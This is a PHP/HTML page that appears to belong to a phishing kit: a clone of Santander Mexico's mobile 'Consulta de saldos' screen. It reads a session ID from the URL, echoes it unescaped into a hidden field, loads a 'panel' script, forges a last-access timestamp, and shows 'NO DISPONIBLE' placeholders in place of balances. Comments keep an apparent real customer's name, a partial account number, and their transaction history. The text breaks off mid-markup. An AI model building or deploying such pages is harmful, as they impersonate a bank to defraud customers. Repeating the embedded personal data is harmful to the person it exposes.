<?php
    $session = $_GET['session'];
?>
<script src="../jquery-1.7.1.min.js"></script>
<script src="script_panel_base.js"></script>
<input type="hidden" name="tipo" id="tipo" value="mobile">
<input type="hidden" name="session" id="session" value="<?=$session;?>">


<super-header _ngcontent-c1="" _nghost-c7="" style="max-width: 937px;">
    <!---->
    <div _ngcontent-c7="" class="ng-star-inserted">
        <nav _ngcontent-c7="" class="navbar mobile-private" style="background: rgb(236, 0, 0);">
            <div _ngcontent-c7="" class="w-100">
                <div _ngcontent-c7="" class="insideNav" style="">
                    <div _ngcontent-c7="" class="row m-0 icons-row">
                        <!---->
                        <div _ngcontent-c7="" class="items col-10 text-center ml-auto">
                            <!---->
                            <!---->
                            <div _ngcontent-c7="" class="ng-star-inserted">
                                <div _ngcontent-c7="" class="d-flex flex-column">
                                    <!---->
                                    <div _ngcontent-c7="" class="p-0 align-content-center ng-star-inserted">
                                        <img _ngcontent-c7="" class="img-responsive logo" src="../assets/logos/classic/santander_classic.svg">
                                    </div>
                                    <!---->
                                    <!---->
                                </div>
                            </div>
                        </div>

                        <!----><button _ngcontent-c7="" class="btn btn-burguer col-1 ng-star-inserted" type="button">
                            <img _ngcontent-c7="" class="burguer" src="../assets/img/burger_menu.svg">
                        </button>
                        <div _ngcontent-c7="" class="col-9 d-flex px-0 mt-1 icons-wrapperv justify-content-end">
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                        </div>
                    </div>
                </div>
            </div>
        </nav>

        <!---->

        <!---->
        <nav _ngcontent-c7="" class="childView ng-star-inserted">
            <div _ngcontent-c7="" class="w-100">
                <div _ngcontent-c7="" class="d-flex justify-content-center">
                    <div _ngcontent-c7="" class="text-center title">
                        <strong _ngcontent-c7="">
                            Consulta de saldos
                        </strong>
                    </div>
                </div>
            </div>
        </nav>
    </div>

    <!---->

    <!---->
</super-header>
<div _ngcontent-c1="" class="w-100">
    <div _ngcontent-c1="" class="shell-center" style="">
        <div _ngcontent-c1="" class="m-auto" style="max-width: 937px;">
            <!---->
            
            <script>
                $(document).ready(function(){
                    var meses = new Array ("Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre");
                    var f=new Date();
                    var strFecha = "??ltimo Acceso: "+f.getDate()+" "+meses[f.getMonth()]+", 2019 00:19 horas";
                    //var strFecha = f.getDate()+' de <span _ngcontent-c7="" class="text-capitalize">'+meses[f.getMonth()]+', '+f.getFullYear()+'</span>';
                    $('#showFecha').html(strFecha);
                });
            </script>


            <super-session-detail _ngcontent-c1="" _nghost-c8="" class="ng-star-inserted">
                <!---->
                <div _ngcontent-c8="" class="session-detail pl-0 container ng-star-inserted">
                    <!---->
                    <!---->
                    <div _ngcontent-c8="" class="row ng-star-inserted">
                        <img _ngcontent-c8="" class="refresh-icon" src="../assets/img/refresh_icon.svg">
                        <div _ngcontent-c8="" class="col-12 my-3">
                            <div _ngcontent-c8="" class="row">
                                <div _ngcontent-c8="" class="col-12 text-center">
                                    <p _ngcontent-c8="" class="username m-0">
                                        <!--ANGEL LEONEL HEREDIA DE ALBA-->
                                        BIENVENIDO
                                    </p>
                                </div>
                            </div>
                            <div _ngcontent-c8="" class="row">
                                <div _ngcontent-c8="" class="col-12 text-center">
                                    <p id="showFecha" _ngcontent-c8="" class="date">
                                        <!--??ltimo Acceso: 17 Agosto, 2019 00:19 horas-->
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </super-session-detail>
        </div>
        <!---->
        <div _ngcontent-c1="" class="m-auto ng-star-inserted" style="max-width: 937px;">
            <super-global-notifications _ngcontent-c1="" _nghost-c9="">
                <!---->
            </super-global-notifications>
        </div>
        <!---->

        <div _ngcontent-c1="" class="row m-auto">
            <!---->
            <div _ngcontent-c1="" class="col-12 m-auto px-0">
                <div _ngcontent-c1="" class="landscape">
                    <div _ngcontent-c1="" class="w-100 m-auto" style="max-width: 937px; min-height: 478px;">

                        <super-shell _ngcontent-c1="">
                            <!---->
                            
                            <super-loader id="loading" style="display: none;" _nghost-c13="" class="ng-star-inserted">
                                <div _ngcontent-c13="" class="ng-star-inserted">
                                    <div _ngcontent-c13="" class="modal-backdrop" style="opacity: .2"></div>
                                    <div _ngcontent-c13="" class="w3-modal w3-animate-opacity d-flex">
                                        <div _ngcontent-c13="" class="w3-modal-content inner mt-auto">
                                            <img _ngcontent-c13="" alt="" class="loader center" src="../assets/loader-ring.gif">
                                        </div>
                                    </div>
                                </div>
                            </super-loader>
                            
                            <router-outlet></router-outlet>
                            <ng-component _nghost-c17="" class="ng-star-inserted">
                                <!---->
                                <div _ngcontent-c17="" class="container-full ng-star-inserted">
                                    <div _ngcontent-c17="" class="row text-center mx-0">
                                        <div _ngcontent-c17="" class="col-12 px-0">
                                            <div _ngcontent-c17="" class="panel-balance">

                                                <div _ngcontent-c17="" class="d-none">
                                                    <div _ngcontent-c17="" class="x_panel landscape header charts">
                                                        <div _ngcontent-c17="" class="row">
                                                            <div _ngcontent-c17="" class="col">
                                                                <p _ngcontent-c17="" class="rojoTitle m-0">Mis finanzas</p>
                                                            </div>
                                                        </div>
                                                        <div _ngcontent-c17="" class="row chart-colors-row">
                                                            <div _ngcontent-c17="" class="offset-8 col-1 pr-0">
                                                                <div _ngcontent-c17="" class="square-earning"></div>
                                                            </div>
                                                            <div _ngcontent-c17="" class="col-1 pl-0">
                                                                <span _ngcontent-c17="" class="earning pl-1">
                                                                    Ingresos
                                                                </span>
                                                            </div>
                                                            <div _ngcontent-c17="" class="col-1 pr-0">
                                                                <div _ngcontent-c17="" class="square-expenses"></div>
                                                            </div>
                                                            <div _ngcontent-c17="" class="col-1 pl-0 col-title">
                                                                <span _ngcontent-c17="" class="expenses pl-1">
                                                                    Egresos
                                                                </span>
                                                            </div>
                                                        </div>
                                                        <div _ngcontent-c17="" class="row row-chart">
                                                            <div _ngcontent-c17="" class="col-3 pr-0 gray mt-3">
                                                                <p _ngcontent-c17="" class="graph-tittles">
                                                                    Mi Dinero
                                                                </p>
                                                                <p _ngcontent-c17="" class="graph-money"> 0.<small>00 MXN</small></p>
                                                            </div>
                                                            <div _ngcontent-c17="" class="col-9 m-0 pr-0 pl-2">
                                                                <super-home-chart _ngcontent-c17="" _nghost-c18="">
                                                                    <table _ngcontent-c18="" id="q-graph">
                                                                        <!---->
                                                                        <tbody _ngcontent-c18="">
                                                                            <tr _ngcontent-c18="" class="qtr" style="left: 25px;">
                                                                                <th _ngcontent-c18="" scope="row">Junio</th>
                                                                                <td _ngcontent-c18="" class="sent bar tooltip-chart" style="z-index: 2; height: 27.769px;">
                                                                                    <span _ngcontent-c18="" class="tooltip-charttext income" style="bottom: 34.769px;"> 2,002.<small>24 MXN</small></span>
                                                                                </td>
                                                                                <td _ngcontent-c18="" class="paid bar tooltip-chart" style="z-index: 2; height: 17.423px;">
                                                                                    <span _ngcontent-c18="" class="tooltip-charttext expenses" style="bottom: 24.423px;"> 1,256.<small>08 MXN</small></span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr _ngcontent-c18="" class="qtr" style="left: 146.167px;">
                                                                                <th _ngcontent-c18="" scope="row">Julio</th>
                                                                                <td _ngcontent-c18="" class="sent bar tooltip-chart" style="z-index: 2; height: 59.836px;">
                                                                                    <span _ngcontent-c18="" class="tooltip-charttext income" style="bottom: 66.836px;"> 4,314.<small>55 MXN</small></span>
                                                                                </td>
                                                                                <td _ngcontent-c18="" class="paid bar tooltip-chart" style="z-index: 2; height: 70px;">
                                                                                    <span _ngcontent-c18="" class="tooltip-charttext expenses" style="bottom: 77px;"> 5,047.<small>42 MXN</small></span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr _ngcontent-c18="" class="qtr" style="left: 271.167px;">
                                                                                <th _ngcontent-c18="" scope="row">Agosto</th>
                                                                                <td _ngcontent-c18="" class="sent bar tooltip-chart income" style="z-index: 2; height: 1.148px;">
                                                                                    <span _ngcontent-c18="" class="tooltip-charttext income" style="bottom: 8.148px;"> 82.<small>98 MXN</small></span>
                                                                                </td>
                                                                                <td _ngcontent-c18="" class="paid bar tooltip-chart" style="z-index: 2; height: 1.372px;">
                                                                                    <span _ngcontent-c18="" class="tooltip-charttext expenses" style="bottom: 8.372px;"> 99.<small>00 MXN</small></span>
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                    <div _ngcontent-c18="" id="ticks">
                                                                        <div _ngcontent-c18="" class="tick" style="height: 17px; width: 386.167px;"></div>
                                                                        <div _ngcontent-c18="" class="tick" style="height: 17px; width: 386.167px;"></div>
                                                                        <div _ngcontent-c18="" class="tick" style="height: 17px; width: 386.167px;"></div>
                                                                        <div _ngcontent-c18="" class="tick" style="height: 17px; width: 386.167px;"></div>
                                                                        <div _ngcontent-c18="" class="tick" style="height: 17px; width: 386.167px;"></div>
                                                                    </div>
                                                                </super-home-chart>
                                                            </div>
                                                        </div>
                                                        <div _ngcontent-c17="" class="row">
                                                            <div _ngcontent-c17="" class="separator-line"></div>
                                                        </div>
                                                        <!---->
                                                        <div _ngcontent-c17="" class="row mt-4 ng-star-inserted">
                                                            <div _ngcontent-c17="" class="col-3 my-auto pl-0">
                                                                <img _ngcontent-c17="" alt="" class="img2 mr-4" src="../assets/img/santanderplus1.svg">
                                                            </div>
                                                            <div _ngcontent-c17="" class="col-3 profit my-auto">
                                                                <p _ngcontent-c17="" class="text-right m-auto">Cu??nto he ganado</p>
                                                            </div>
                                                            <div _ngcontent-c17="" class="col-3 my-auto pl-0 text-left">
                                                                <span _ngcontent-c17="" class="letra2 text-lg-2 text-left m-auto"> 0.<small>00 MXN</small></span>
                                                            </div>
                                                            <div _ngcontent-c17="" class="col-3 m-auto">
                                                                <button _ngcontent-c17="" class="buttonGray m-auto"> Ver detalle </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>

                                                <!---->
                                                <div _ngcontent-c17="" class="pb-sm-3 ng-star-inserted">
                                                    <super-collapse-list _ngcontent-c17="" _nghost-c19="">
                                                        <!---->
                                                        <div _ngcontent-c19="" class="container-100 px-0 mx-0 m-0 ng-star-inserted">
                                                            <!---->
                                                            <div _ngcontent-c19="" class="ng-star-inserted">
                                                                <!---->
                                                                <collapsible-list _ngcontent-c19="" class="m-0 collapsible-list p-0 ng-star-inserted" _nghost-c4="">
                                                                    <collapsible-list-item _ngcontent-c19="">
                                                                        <collapsible-header _ngcontent-c19="" class="collapsible-header p-0" _nghost-c5="">
                                                                            <div _ngcontent-c19="" class="row mx-0">
                                                                                <div _ngcontent-c19="" class="title text-left col-5 pr-0">
                                                                                    Cuenta en pesos
                                                                                </div>
                                                                                <div _ngcontent-c19="" class="col-6 pr-0">
                                                                                    <!---->
                                                                                    <div _ngcontent-c19="" class="currency text-right novisibility ng-star-inserted"> CARGANDO</div>
                                                                                    <!--<div _ngcontent-c19="" class="currency text-right novisibility ng-star-inserted"> 0.<small>00 MXN</small></div>-->
                                                                                    <!---->
                                                                                </div>
                                                                                <div _ngcontent-c19="" class="col-1 m-0 p-0">
                                                                                    <div _ngcontent-c19="" class="more morelands">
                                                                                        <img _ngcontent-c19="" alt="" src="../assets/img/consolidadosup.svg" class="">
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </collapsible-header>
                                                                        <collapsible-body _ngcontent-c19="" class="collapse-body collapsible-body p-0 ng-tns-c6-17 ng-trigger ng-trigger-collapsibleBodyState ng-star-inserted" _nghost-c6="" style="box-shadow: rgb(208, 208, 208) 0px 4px 4px -2px inset, rgb(208, 208, 208) 0px -3px 2px -1px inset; overflow: inherit;">
                                                                            <ul _ngcontent-c19="" class="list-group">
                                                                                <li _ngcontent-c19="" class="list-group-item list-group-item-action p-0">

                                                                                    <!---->
                                                                                    <table _ngcontent-c19="" class="table table-hover ng-star-inserted" style="">
                                                                                        <caption _ngcontent-c19=""></caption>
                                                                                        <thead _ngcontent-c19="">
                                                                                            <tr _ngcontent-c19="" class="d-none">
                                                                                                <th _ngcontent-c19="" class="text-left pl-3">
                                                                                                    N??mero de Cuenta
                                                                                                </th>
                                                                                                <th _ngcontent-c19="" class="text-center">
                                                                                                    Disponible
                                                                                                </th>
                                                                                            </tr>
                                                                                        </thead>
                                                                                        <tbody _ngcontent-c19="" class="table-body border-none">
                                                                                            <!---->
                                                                                            <tr _ngcontent-c19="" class="ng-star-inserted" style="">
                                                                                                <td _ngcontent-c19="" class="info">
                                                                                                    <div _ngcontent-c19="" class="row m-0 p-0">
                                                                                                        <div _ngcontent-c19="" class="col-md-2 col-sm-2 col-xs-2 mo2 text-right pl-1">
                                                                                                            <img _ngcontent-c19="" alt="" src="../assets/img/CuentasyChequerasicon.svg">
                                                                                                        </div>
                                                                                                        <div _ngcontent-c19="" class="col-md-10 col-sm-10 col-xs-10 mo text-left pt-lg-0 cuenta">
                                            <!--<p _ngcontent-c19="">SUPER CUENTA UNIVERSITARIA</p>-->
                                            <p _ngcontent-c19="">NO DISPONIBLE</p>
                                                                            <p _ngcontent-c19="" class="decoration">
                                                                <!--0***5044-->
</p>
                                                                                                            <!---->
                                                                                                            <!---->
                                                                                                        </div>
                                                                                                    </div>
                                                                                                </td>
                                                                                                <td _ngcontent-c19="" class="mount balance text-right pl-0">
                                                    <!--<span _ngcontent-c19="">0.00 <small _ngcontent-c19="" class="cents">MXN</small>
                                                    </span>-->
                                                        <span _ngcontent-c19="">NO DISPONIBLE
                                                    </span>
                                                                                                    <img _ngcontent-c19="" alt="" src="../assets/img/arrowright.svg" class="right">
                                                                                                </td>
                                                                                            </tr>
                                                                                        </tbody>
                                                                                    </table>

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->
                                                                                </li>
                                                                            </ul>
                                                                        </collapsible-body>
                                                                    </collapsible-list-item>
                                                                </collapsible-list>
                                                            </div>
                                                            <div _ngcontent-c19="" class="ng-star-inserted">
                                                                <!---->
                                                            </div>
                                                            <div _ngcontent-c19="" class="ng-star-inserted">
                                                                <!---->
                                                            </div>
                                                            <div _ngcontent-c19="" class="ng-star-inserted">
                                                                <!---->
                                                                <collapsible-list _ngcontent-c19="" class="m-0 collapsible-list p-0 ng-star-inserted" _nghost-c4="">
                                                                    <collapsible-list-item _ngcontent-c19="">
                                                                        <collapsible-header _ngcontent-c19="" class="collapsible-header p-0" _nghost-c5="">
                                                                            <div _ngcontent-c19="" class="row mx-0">
                                                                                <div _ngcontent-c19="" class="title text-left col-5 pr-0">
                                                                                    Fondos de inversi??n
                                                                                </div>
                                                                                <div _ngcontent-c19="" class="col-6 pr-0">
                                                                                    <!---->
                                                                                    <!---->
                                                                                </div>
                                                                                <div _ngcontent-c19="" class="col-1 m-0 p-0">
                                                                                    <div _ngcontent-c19="" class="more morelands">
                                                                                        <img _ngcontent-c19="" alt="" src="../assets/img/consolidadosup.svg" class="rotate">
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </collapsible-header>
                                                                        <collapsible-body _ngcontent-c19="" class="collapse-body collapsible-body p-0 ng-tns-c6-18 ng-trigger ng-trigger-collapsibleBodyState ng-star-inserted" _nghost-c6="" style="height: 0px; padding-top: 0px; padding-bottom: 0px; border-bottom: none; box-shadow: none; overflow: hidden;">
                                                                            <ul _ngcontent-c19="" class="list-group">
                                                                                <li _ngcontent-c19="" class="list-group-item list-group-item-action p-0">

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->
                                                                                    <table _ngcontent-c19="" class="table table-hover line-fon-inversion ng-star-inserted" style="">
                                                                                        <!---->
                                                                                        <thead _ngcontent-c19="">
                                                                                            <tr _ngcontent-c19="" class="d-none">
                                                                                                <th _ngcontent-c19="" class="text-left pl-3">N??mero de Contrato</th>
                                                                                                <th _ngcontent-c19="" class="text-center">Cantidad t??tulos</th>
                                                                                                <th _ngcontent-c19="" class="text-center">Precio</th>
                                                                                                <th _ngcontent-c19="" class="text-center">Saldo</th>
                                                                                            </tr>
                                                                                        </thead>
                                                                                        <tbody _ngcontent-c19="" class="table-body">
                                                                                            <!---->
                                                                                        </tbody>
                                                                                    </table>

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->
                                                                                </li>
                                                                            </ul>
                                                                        </collapsible-body>
                                                                    </collapsible-list-item>
                                                                </collapsible-list>
                                                            </div>
                                                            <div _ngcontent-c19="" class="ng-star-inserted">
                                                                <!---->
                                                            </div>
                                                            <div _ngcontent-c19="" class="ng-star-inserted">
                                                                <!---->
                                                                <collapsible-list _ngcontent-c19="" class="m-0 collapsible-list p-0 ng-star-inserted" _nghost-c4="">
                                                                    <collapsible-list-item _ngcontent-c19="">
                                                                        <collapsible-header _ngcontent-c19="" class="collapsible-header p-0" _nghost-c5="">
                                                                            <div _ngcontent-c19="" class="row mx-0">
                                                                                <div _ngcontent-c19="" class="title text-left col-5 pr-0">
                                                                                    Mis metas
                                                                                </div>
                                                                                <div _ngcontent-c19="" class="col-6 pr-0">
                                                                                    <!---->
                                                                                    <!---->
                                                                                </div>
                                                                                <div _ngcontent-c19="" class="col-1 m-0 p-0">
                                                                                    <div _ngcontent-c19="" class="more morelands">
                                                                                        <img _ngcontent-c19="" alt="" src="../assets/img/consolidadosup.svg" class="rotate">
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </collapsible-header>
                                                                        <collapsible-body _ngcontent-c19="" class="collapse-body collapsible-body p-0 ng-tns-c6-19 ng-trigger ng-trigger-collapsibleBodyState ng-star-inserted" _nghost-c6="" style="height: 0px; padding-top: 0px; padding-bottom: 0px; border-bottom: none; box-shadow: none; overflow: hidden;">
                                                                            <ul _ngcontent-c19="" class="list-group">
                                                                                <li _ngcontent-c19="" class="list-group-item list-group-item-action p-0">

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->
                                                                                    <table _ngcontent-c19="" class="table table-hover ng-star-inserted" style="">
                                                                                        <!---->
                                                                                        <!---->
                                                                                        <tbody _ngcontent-c19="" class="table-body">
                                                                                            <!---->
                                                                                            <!---->
                                                                                        </tbody>
                                                                                    </table>

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->
                                                                                </li>
                                                                            </ul>
                                                                        </collapsible-body>
                                                                    </collapsible-list-item>
                                                                </collapsible-list>
                                                            </div>
                                                            <div _ngcontent-c19="" class="ng-star-inserted">
                                                                <!---->
                                                                <collapsible-list _ngcontent-c19="" class="m-0 collapsible-list p-0 ng-star-inserted" _nghost-c4="">
                                                                    <collapsible-list-item _ngcontent-c19="">
                                                                        <collapsible-header _ngcontent-c19="" class="collapsible-header p-0" _nghost-c5="">
                                                                            <div _ngcontent-c19="" class="row mx-0">
                                                                                <div _ngcontent-c19="" class="title text-left col-5 pr-0">
                                                                                    Inversiones plazo
                                                                                </div>
                                                                                <div _ngcontent-c19="" class="col-6 pr-0">
                                                                                    <!---->
                                                                                    <!---->
                                                                                </div>
                                                                                <div _ngcontent-c19="" class="col-1 m-0 p-0">
                                                                                    <div _ngcontent-c19="" class="more morelands">
                                                                                        <img _ngcontent-c19="" alt="" src="../assets/img/consolidadosup.svg" class="rotate">
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </collapsible-header>
                                                                        <collapsible-body _ngcontent-c19="" class="collapse-body collapsible-body p-0 ng-tns-c6-20 ng-trigger ng-trigger-collapsibleBodyState ng-star-inserted" _nghost-c6="" style="height: 0px; padding-top: 0px; padding-bottom: 0px; border-bottom: none; box-shadow: none; overflow: hidden;">
                                                                            <ul _ngcontent-c19="" class="list-group">
                                                                                <li _ngcontent-c19="" class="list-group-item list-group-item-action p-0">

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->
                                                                                    <table _ngcontent-c19="" class="table table-hover ng-star-inserted" style="">
                                                                                        <!---->
                                                                                        <thead _ngcontent-c19="">
                                                                                            <!---->
                                                                                        </thead>
                                                                                        <!---->
                                                                                        <!---->
                                                                                        <tbody _ngcontent-c19="" class="ng-star-inserted">

                                                                                        </tbody>
                                                                                    </table>

                                                                                    <!---->

                                                                                    <!---->

                                                                                    <!---->
                                                                                </li>
                                                                            </ul>
                                                                        </collapsible-body>
                                                                    </collapsible-list-item>
                                                                </collapsible-list>
                                                            </div>
                                                            <div _ngcontent-c19="" class="ng-star-inserted">
                                                                <!---->
                                                            </div>
                                                            <div _ngcontent-c19="" class="ng-star-inserted">
                                                                <!---->
                                                            </div>
                                                            <div _ngcontent-c19="" class="ng-star-inserted">
                                                                <!---->
                                                            </div>
                                                        </div>
                                                    </super-collapse-list>
                                                </div>
                                                <!---->
                                            </div>
                                        </div>

                                        <div _ngcontent-c17="" class="d-none">

                                            <super-favorites _ngcontent-c17="" _nghost-c20="">
                                                <div _ngcontent-c20="" class="w-100 favorites pl-4">
                                                    <div _ngcontent-c20="" class="pl-2">
                                                        <div _ngcontent-c20="" class="row no-gutters">

                                                            <div _ngcontent-c20="" class="col-10 text-left">
                                                                <label _ngcontent-c20="" class="favs-title">
                                                                    <strong _ngcontent-c20="">Mis Favoritos</strong>

                                                                    <!----><span _ngcontent-c20="" class="tooltip-info ng-star-inserted">
                                                                        <span _ngcontent-c20="" class="tooltip-info-text text-left">
                                                                            <p _ngcontent-c20="" class="mb-0">
                                                                                Si a??n no tienes Favoritos, te invitamos a agregarlos desde una operaci??n.
                                                                            </p>
                                                                        </span>
                                                                        <img _ngcontent-c20="" alt="" class="img-responsive" src="../assets/img/tooltip_id.svg">
                                                                    </span>
                                                                </label>
                                                            </div>
                                                            <div _ngcontent-c20="" class="col-1 gear text-center">
                                                                <span _ngcontent-c20="" class="favs-icon-coachmark"></span>
                                                            </div>

                                                            <!---->
                                                        </div>
                                                        <!---->
                                                    </div>
                                                    <div _ngcontent-c20="" style="height: 0px;"></div>
                                                </div>
                                            </super-favorites>

                                            <div _ngcontent-c17="" class="pl-4">
                                                <!---->
                                                <div _ngcontent-c17="" class="d-none d-lg-block mb-4 pl-2 ng-star-inserted">

                                                    <div _ngcontent-c17="" class="container2">
                                                        <p _ngcontent-c17="" class="rojoTitle mb-0 pb-3 border-alias font-weight-bold">
                                                            Mis ??ltimos movimientos
                                                        </p>
                                                        <perfect-scrollbar _ngcontent-c17="">
                                                            <div style="position: static;" class="ps">
                                                                <div class="ps-content">
                                                                    <div _ngcontent-c17="" class="ultMov mb-4">
                                                                        <!---->
                                                                        <div _ngcontent-c17="" class="ng-star-inserted">
                                                                            <div _ngcontent-c17="" class="row justify-content-between row-move">
                                                                                <div _ngcontent-c17="" class="col-2 rojo move-date">
                                                                                    01 Ago
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 m-0 p-0">
                                                                                    <p _ngcontent-c17="" class="letra1">GENERACION DE ADEUDO</p>
                                                                                    <p _ngcontent-c17="" class="letra3">SUPER CUENTA UNIVERSITARIA</p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 m-0 p-0">
                                                                                    <p _ngcontent-c17="" class="text-green mount">
                                                                                        <span _ngcontent-c17="" class="cents col-12 pl-0"> 82.<small>98 MXN</small></span>
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                            <div _ngcontent-c17="" class="row">
                                                                                <div _ngcontent-c17="" class="col-2"></div>
                                                                                <div _ngcontent-c17="" class="col-5 panel">
                                                                                    <p _ngcontent-c17="" class="letra4">
                                                                                        ??Quieres pagar a plazos?
                                                                                    </p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 panel">
                                                                                    <p _ngcontent-c17="" class="letra5 text-right">
                                                                                        <u _ngcontent-c17="">S??, hacer Pago F??cil</u>
                                                                                    </p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="lineborder"></div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-c17="" class="ng-star-inserted">
                                                                            <div _ngcontent-c17="" class="row justify-content-between row-move">
                                                                                <div _ngcontent-c17="" class="col-2 rojo move-date">
                                                                                    01 Ago
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 m-0 p-0">
                                                                                    <p _ngcontent-c17="" class="letra1">ADYENMX*SPOTIFY</p>
                                                                                    <p _ngcontent-c17="" class="letra3">SUPER CUENTA UNIVERSITARIA</p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 m-0 p-0">
                                                                                    <p _ngcontent-c17="" class="text-yellow mount">
                                                                                        <span _ngcontent-c17="" class="cents col-12 pl-0">- 99.<small>00 MXN</small></span>
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                            <div _ngcontent-c17="" class="row">
                                                                                <div _ngcontent-c17="" class="col-2"></div>
                                                                                <div _ngcontent-c17="" class="col-5 panel">
                                                                                    <p _ngcontent-c17="" class="letra4">
                                                                                        ??Quieres pagar a plazos?
                                                                                    </p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 panel">
                                                                                    <p _ngcontent-c17="" class="letra5 text-right">
                                                                                        <u _ngcontent-c17="">S??, hacer Pago F??cil</u>
                                                                                    </p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="lineborder"></div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-c17="" class="ng-star-inserted">
                                                                            <div _ngcontent-c17="" class="row justify-content-between row-move">
                                                                                <div _ngcontent-c17="" class="col-2 rojo move-date">
                                                                                    24 Jul
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 m-0 p-0">
                                                                                    <p _ngcontent-c17="" class="letra1">SORIANA166 PLAC COLIMA COL 0000000</p>
                                                                                    <p _ngcontent-c17="" class="letra3">SUPER CUENTA UNIVERSITARIA</p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 m-0 p-0">
                                                                                    <p _ngcontent-c17="" class="text-yellow mount">
                                                                                        <span _ngcontent-c17="" class="cents col-12 pl-0">- 220.<small>00 MXN</small></span>
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                            <div _ngcontent-c17="" class="row">
                                                                                <div _ngcontent-c17="" class="col-2"></div>
                                                                                <div _ngcontent-c17="" class="col-5 panel">
                                                                                    <p _ngcontent-c17="" class="letra4">
                                                                                        ??Quieres pagar a plazos?
                                                                                    </p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 panel">
                                                                                    <p _ngcontent-c17="" class="letra5 text-right">
                                                                                        <u _ngcontent-c17="">S??, hacer Pago F??cil</u>
                                                                                    </p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="lineborder"></div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-c17="" class="ng-star-inserted">
                                                                            <div _ngcontent-c17="" class="row justify-content-between row-move">
                                                                                <div _ngcontent-c17="" class="col-2 rojo move-date">
                                                                                    24 Jul
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 m-0 p-0">
                                                                                    <p _ngcontent-c17="" class="letra1">NUEVO MILENIO COLIMA COL 0000000</p>
                                                                                    <p _ngcontent-c17="" class="letra3">SUPER CUENTA UNIVERSITARIA</p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 m-0 p-0">
                                                                                    <p _ngcontent-c17="" class="text-yellow mount">
                                                                                        <span _ngcontent-c17="" class="cents col-12 pl-0">- 22.<small>50 MXN</small></span>
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                            <div _ngcontent-c17="" class="row">
                                                                                <div _ngcontent-c17="" class="col-2"></div>
                                                                                <div _ngcontent-c17="" class="col-5 panel">
                                                                                    <p _ngcontent-c17="" class="letra4">
                                                                                        ??Quieres pagar a plazos?
                                                                                    </p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 panel">
                                                                                    <p _ngcontent-c17="" class="letra5 text-right">
                                                                                        <u _ngcontent-c17="">S??, hacer Pago F??cil</u>
                                                                                    </p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="lineborder"></div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-c17="" class="ng-star-inserted">
                                                                            <div _ngcontent-c17="" class="row justify-content-between row-move">
                                                                                <div _ngcontent-c17="" class="col-2 rojo move-date">
                                                                                    24 Jul
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 m-0 p-0">
                                                                                    <p _ngcontent-c17="" class="letra1">DULCERIA LA ESM COLIMA COL 0000000</p>
                                                                                    <p _ngcontent-c17="" class="letra3">SUPER CUENTA UNIVERSITARIA</p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 m-0 p-0">
                                                                                    <p _ngcontent-c17="" class="text-yellow mount">
                                                                                        <span _ngcontent-c17="" class="cents col-12 pl-0">- 135.<small>01 MXN</small></span>
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                            <div _ngcontent-c17="" class="row">
                                                                                <div _ngcontent-c17="" class="col-2"></div>
                                                                                <div _ngcontent-c17="" class="col-5 panel">
                                                                                    <p _ngcontent-c17="" class="letra4">
                                                                                        ??Quieres pagar a plazos?
                                                                                    </p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 panel">
                                                                                    <p _ngcontent-c17="" class="letra5 text-right">
                                                                                        <u _ngcontent-c17="">S??, hacer Pago F??cil</u>
                                                                                    </p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="lineborder"></div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-c17="" class="ng-star-inserted">
                                                                            <div _ngcontent-c17="" class="row justify-content-between row-move">
                                                                                <div _ngcontent-c17="" class="col-2 rojo move-date">
                                                                                    23 Jul
                                                                                </div>
